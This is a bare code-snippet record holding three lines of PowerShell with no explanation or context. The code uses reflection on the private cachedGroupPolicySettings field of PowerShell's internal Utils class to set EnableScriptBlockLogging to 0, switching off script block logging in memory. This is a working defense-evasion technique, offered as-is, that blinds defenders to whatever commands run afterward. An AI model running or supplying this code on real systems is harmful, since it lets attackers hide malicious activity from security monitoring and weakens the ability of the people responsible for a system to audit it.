---
id: aca08c08-474b-4052-805a-c480b3c7d45d
type: code
language: ps1
verified: false
created_at: '2023-04-06T03:56:25.973607+00:00'
updated_at: '2023-04-10T20:36:17.635844+00:00'
---

# Code Snippet aca08c08

**Language**: ps1

```ps1
$settings = [Ref].Assembly.GetType("System.Management.Automation.Utils").GetField("cachedGroupPolicySettings","NonPublic,Static").GetValue($null);
$settings["HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging"] = @{}
$settings["HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging"].Add("EnableScriptBlockLogging", "0")
```
